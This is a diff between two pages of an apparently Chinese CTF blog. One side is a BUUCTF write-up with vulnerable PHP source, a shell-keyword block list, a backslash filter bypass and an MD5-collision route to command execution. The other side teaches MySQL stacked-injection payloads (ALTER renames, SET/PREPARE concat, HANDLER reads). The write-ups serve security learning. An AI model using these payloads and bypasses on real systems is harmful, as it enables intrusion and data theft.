@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="easy_web, null">
+    <meta name="keywords" content="堆叠注入, null">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>easy_web | null</title>
+    <title>堆叠注入 | null</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -287,12 +287,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/1.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/23.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">easy_web</h1>
+                    <h1 class="description center-align post-title">堆叠注入</h1>
                 </div>
             </div>
         </div>
@@ -314,8 +314,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/BUUCTF/">
-                                <span class="chip bg-color">BUUCTF</span>
+                            <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
+                                <span class="chip bg-color">SQL注入</span>
                             </a>
                         
                     </div>
@@ -339,21 +339,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2020-11-24
+                    2020-11-30
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
-                    2020-11-24
+                    2020-11-30
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    754
+                    848
                 </div>
                 
 
@@ -375,71 +375,101 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="easy-web"><a href="#easy-web" class="headerlink" title="easy_web"></a>easy_web</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><strong>1.md5强碰撞</strong></p>
-<p><strong>2.rce</strong></p>
-<p><strong>3.文件包含</strong></p>
-<h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>打开题目直接F12</p>
-<p><img src="/../images/2020-11-24_06-41.png" alt=""></p>
-<p>可以看到图片这里是base64编码，再看url中的<code>img=TXpVek5UTTFNbVUzTURabE5qYz0</code>，这一串看着也像base64编码，对它进行base64解码(这里我注意到这串字符串的长度为27,不符合base64特征，base64编码后的字符串长度应该是4的整数倍，所以添加一个‘=’后再进行解码)</p>
-<p><img src="/../images/2020-11-24_06-49.png" alt=""></p>
-<p>推测解码过程<code>base64.decode-&gt;base64.decode-&gt;hex</code>,于是可以一个解码脚本</p>
-<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> base64
-<span class="token keyword">import</span> binascii
-c<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>a2b_hex<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">//</span>将十六进制形式的二进制数据转化为ascii码</code></pre>
-<p>最后解出<code>img</code>参数为‘555.png’，由此猜测可以通过<code>img</code>传参进行任意文件读取，传递的参数要先经过上述解码的逆过程<code>hex-&gt;base64.encode-&gt;base64.encode</code>,写一个编码脚本</p>
-<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> binascii
-<span class="token keyword">import</span> base64
-filename <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
-hex <span class="token operator">=</span> binascii<span class="token punctuation">.</span>b2a_hex<span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token operator">//</span>将二进制数据转化为十六进制形式
-base1 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>hex<span class="token punctuation">)</span>
-base2 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>base1<span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span>base2<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
-<p>尝试查看index.php—-》<code>TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</code>，</p>
-<pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//index.php的源码</span>
-<span class="token delimiter">&lt;?php</span>
-<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token constant">E_ALL</span> <span class="token operator">||</span> <span class="token operator">~</span> <span class="token constant">E_NOTICE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
-    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <h1 id="堆叠注入的产生"><a href="#堆叠注入的产生" class="headerlink" title="堆叠注入的产生"></a>堆叠注入的产生</h1><p><code>mysqli_multi_query(mysqli $link,string $query)</code>:执行一个SQL语句，或者多个使用分号分割的SQL语句。</p>
+<h2 id="堆叠注入最常用两个语句"><a href="#堆叠注入最常用两个语句" class="headerlink" title="堆叠注入最常用两个语句"></a>堆叠注入最常用两个语句</h2><pre class=" language-mysql"><code class="language-mysql">show tables;
+show columns from TABLE;</code></pre>
+<p>由于堆叠注入可以执行各种<code>sql</code>语句，所以一般都会禁掉许多关键字，例如，<code>select,set/prepare,alter,rename,insert</code>等等许多常用的查询关键字。这里使用<code>强网杯随便注</code>来介绍四种绕过方式，或者说是替代查询字段内容的常用语句。</p>
+<p>存在两个表，<code>1919810931114514，words</code>,查看表字段之后发现<code>flag</code>在<code>1919810931114514</code>表中，<code>words</code>内容如下：</p>
+<p><img src="/../images/2020-11-30_10-07.png" alt=""></p>
+<p>这里就发现了在<code>show columns from words</code>的内容应该就是页面自动插查询显示的内容，</p>
+<p><img src="/../images/2020-11-30_10-12.png" alt=""></p>
+<p><img src="/../images/2020-11-30_10-14.png" alt=""></p>
+<p>看到禁用了如此多常用关键词，所以这里产生了第一种绕过方式，</p>
+<p>猜测这里使用的查询语句是<code>select * from words where id=1</code>,而<code>flag</code>字段在<code>1919810931114514</code>中，所以应该将<code>1919810931114514</code>表名改为<code>words</code>，再将<code>flag</code>字段改为<code>id</code>。</p>
+<pre class=" language-mysql"><code class="language-mysql">alter table words rename to words1;
+alter table `1919810931114514` rename to words;
+alter table words change flag id varchar(100);
+最后在使用`inject=1' or 1=1%23`就可以查出flag</code></pre>
+<p>第二种绕过方式：<code>set</code>和<code>prepare</code>预处理语句利用</p>
+<pre class=" language-mysql"><code class="language-mysql">Set @a=concat('se','lect *  from `1919810931114514`;');Prepare sql from @a;execute sql;</code></pre>
+<p>这里其实是简化了绕过难度，因为它还允许<code>set</code>和<code>prepare</code>同时存在，它这里的过滤方式没有考虑大小写，</p>
+<p><img src="/../images/2020-11-30_10-49.png" alt=""></p>
+<p>但是如果这里采用了<code>stristr</code>函数忽略了大小写，这种方式就不行了。</p>
+<p>第三种绕过方式，基于<code>mysql存储过程</code>，(虽然没能在buu上用这种方式复现出来，但是觉得挺有意思的，就记录一下)</p>
+<p><code>存储过程就是一段具有名字的代码，用来完成一个特定的功能</code>，在我看来存储过程就是相当于定义一个函数。</p>
+<pre class=" language-mysql"><code class="language-mysql">mysql存储过程中的关键语法：
+语句结束符： DELIMITER $$ 或 DELIMITER //
+声明存储过程：
+CREATE PROCEDURE demo(IN p_in int,OUT p_out int)
+存储过程开始和结束符号：
+BEGIN...END
+变量赋值：
+SET @p_in=1
+创建mysql存储过程，存储函数：
+create procedure 存储过程名/函数名(参数)
+调用存储过程：
+call sp_name[(传参)];</code></pre>
+<pre class=" language-mysql"><code class="language-mysql">//具体操作过程
+MariaDB [security]> select * from users;
++----+----------+------------+
+| id | username | password   |
++----+----------+------------+
+|  1 | Dumb     | Dumb       |
+|  2 | Angelina | I-kill-you |
+|  3 | Dummy    | p@ssword   |
+|  4 | secure   | crappy     |
+|  5 | stupid   | stupidity  |
+|  6 | superman | genious    |
+|  7 | batman   | mob!le     |
+|  8 | admin    | admin      |
+|  9 | admin1   | admin1     |
+| 10 | admin2   | admin2     |
+| 11 | admin3   | admin3     |
+| 12 | dhakkan  | Dumbo      |
+| 13 | admin4   | admin      |
++----+----------+------------+
+13 rows in set (0.000 sec)
+MariaDB [security]> delimiter $$
+MariaDB [security]> create procedure test(in cnt text(1024),out res text(1024)) 
+    -> begin
+    -> set res=cnt;
+    -> end$$
+Query OK, 0 rows affected (0.005 sec)
 
-<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/[^a-zA-Z0-9.]+/"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-    <span class="token keyword">echo</span> <span class="token string">'&lt;img src ="./ctf3.jpeg">'</span><span class="token punctuation">;</span>
-    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"xixiï½ no flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
-    <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">echo</span> <span class="token string">"&lt;img src='data:image/gif;base64,"</span> <span class="token punctuation">.</span> <span class="token variable">$txt</span> <span class="token punctuation">.</span> <span class="token string">"'>&lt;/img>"</span><span class="token punctuation">;</span>
-    <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-<span class="token keyword">echo</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>
-<span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
-<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|&lt;|>/i"</span><span class="token punctuation">,</span> <span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string">"forbid ~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-        <span class="token keyword">echo</span> `<span class="token variable">$cmd</span>`<span class="token punctuation">;</span>
-    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
-        <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token string">"md5 is funny ~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-<span class="token punctuation">}</span>
-<span class="token delimiter">?></span>
-<span class="token comment" spellcheck="true">//通过分析源码发现index.php对$cmd参数进行了合法性检查，在绕过合法性检查后再进行md5碰撞就能rce。</span></code></pre>
-<p><strong>绕过合法性检测的两种方式</strong></p>
-<p>1.因为正则表达式对<code>\</code>的过滤出现了问题，所以可以使用<code>ca\t,l\s</code>来绕过，</p>
-<p>写一个测试脚本来证明<code>preg_match</code>中的正则表达式无法匹配<code>\</code>，</p>
-<p><img src="/../images/2020-11-24_07-32.png" alt=""></p>
-<p>再来解释一下<code>\</code>在bash中放在命令中的话，表示连接下一行</p>
-<p><img src="/../images/2020-11-24_07-35.png" alt=""></p>
-<p>2.使用<code>sort</code>,该命令用于将文文件的每一行作为一个单位，相互比较，从前向后，依次按ASCII码进行比较，最后将他们按升序输出。</p>
-<p><img src="/../images/2020-11-24_07-39.png" alt=""></p>
-<p><strong>md5碰撞</strong></p>
-<p>几种常见的md5<a href="https://www.cnblogs.com/kuaile1314/p/11968108.html" target="_blank" rel="noopener">碰撞</a>及<a href="https://xz.aliyun.com/t/1927" target="_blank" rel="noopener">弱类型问题</a>，这几篇文章写的比较好，还有<a href="https://www.cnblogs.com/Primzahl/p/6018158.html" target="_blank" rel="noopener">常见0e开头的md5字符串</a></p>
-<p>如何在短时间内生成两个不相同但是md5<a href="https://xz.aliyun.com/t/2232" target="_blank" rel="noopener">值相等的字符串</a></p>
-<p>最后先<code>dir%20/或者l\s%20/</code>（dir和ls的功能相同，打印目录内容），查看到存在<code>flag</code>，在通过<code>ca\t%20flag或者sort /flag</code>拿到flag。</p>
+MariaDB [security]> call test(0x73656c656374202a2066726f6d2075736572733b,@sql)$$Query OK, 0 rows affected (0.004 sec)
+MariaDB [security]> prepare sss from @sql$$
+Query OK, 0 rows affected (0.000 sec)
+Statement prepared
+MariaDB [security]> execute sss$$
++----+----------+------------+
+| id | username | password   |
++----+----------+------------+
+|  1 | Dumb     | Dumb       |
+|  2 | Angelina | I-kill-you |
+|  3 | Dummy    | p@ssword   |
+|  4 | secure   | crappy     |
+|  5 | stupid   | stupidity  |
+|  6 | superman | genious    |
+|  7 | batman   | mob!le     |
+|  8 | admin    | admin      |
+|  9 | admin1   | admin1     |
+| 10 | admin2   | admin2     |
+| 11 | admin3   | admin3     |
+| 12 | dhakkan  | Dumbo      |
+| 13 | admin4   | admin      |
++----+----------+------------+
+13 rows in set (0.000 sec)
+MariaDB [security]> select @sql$$
++----------------------+
+| @sql                 |
++----------------------+
+| select * from users; |
++----------------------+
+1 row in set (0.000 sec)</code></pre>
+<p>第四种绕过方式：</p>
+<p>利用<code>handler...open</code>语句进行绕过，<a href="https://dev.mysql.com/doc/refman/8.0/en/handler.html" target="_blank" rel="noopener">该语句的官方解释</a>，</p>
+<pre class=" language-mysql"><code class="language-mysql">payload：
+1';handler `1919810931114514` open;handler `1919810931114514` read first;handler `1919810931114514` close;#</code></pre>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -483,7 +513,7 @@ base2 <span class="token operator">=</span> base64<span class="token punctuation
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://henuhub.com/2020/11/24/article2/">http://henuhub.com/2020/11/24/article2/</a>
+                    <a href="http://henuhub.com/2020/11/30/article7/">http://henuhub.com/2020/11/30/article7/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -521,8 +551,8 @@ base2 <span class="token operator">=</span> base64<span class="token punctuation
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/BUUCTF/">
-                                    <span class="chip bg-color">BUUCTF</span>
+                                <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
+                                    <span class="chip bg-color">SQL注入</span>
                                 </a>
                             
                         </div>
@@ -693,7 +723,7 @@ base2 <span class="token operator">=</span> base64<span class="token punctuation
         repo: 'kelis-cpu.github.io',
         owner: 'kelis-cpu',
         admin: "kelis-cpu",
-        id: '2020-11-24T06-05-13',
+        id: '2020-11-30T09-48-03',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -717,34 +747,32 @@ base2 <span class="token operator">=</span> base64<span class="token punctuation
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+                <i class="far fa-dot-circle"></i>&nbsp;Current
+            </div>
             <div class="card">
-                <a href="/2020/11/26/article3/">
+                <a href="/2020/11/30/article7/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="朴实无华">
+                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="堆叠注入">
                         
-                        <span class="card-title">朴实无华</span>
+                        <span class="card-title">堆叠注入</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            朴实无华原理1.代码审计
-2.弱类型转换
-3.命令执行及常见绕过方式
-解题过程打开题目页面说无法确认更多头部信息，直接F12查看一下头部信息，未发现有价值的东西，
-
-然后先扫描一下该网站，扫描什么也没有发现，再来看看robots.txt，发
+                            堆叠注入的产生mysqli_multi_query(mysqli $link,string $query):执行一个SQL语句，或者多个使用分号分割的SQL语句。
+堆叠注入最常用两个语句show tables;
+show columns f
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-11-26
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-11-30
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -757,11 +785,12 @@ base2 <span class="token operator">=</span> base64<span class="token punctuation
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/BUUCTF/">
-                        <span class="chip bg-color">BUUCTF</span>
+                    <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
+                        <span class="chip bg-color">SQL注入</span>
                     </a>
                     
                 </div>
@@ -775,25 +804,28 @@ base2 <span class="token operator">=</span> base64<span class="token punctuation
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/11/22/article1/">
+                <a href="/2020/11/29/article6/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="Unicorn shop+Web1+easy_serialize_php">
+                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="phpweb">
                         
-                        <span class="card-title">Unicorn shop+Web1+easy_serialize_php</span>
+                        <span class="card-title">phpweb</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            一.Unicorn shop原理：Unicode数字显示漏洞一些国家的数字在显示的时候可能造成问题，例如孟加拉语的0-9是০ ১ ২ ৩ ৪ ৫ ৬ ৭ ৮ ৯，但是这里的৪ (U+09EA) 实际上是数字4，详细原理参考文章1，文章2
-解
+                            原理1.call_user_func()RCE
+2.命令空间绕过
+解题步骤目录扫描，查看robots.txt等一系列操作之后未果，F12看到页面一直在刷新，无法仔细查看于是使用burp抓包，
+
+看到传递了两个参数，试试是不是sql注入，fu
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-11-22
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-11-29
                             </span>
                         <span class="publish-author">
                             
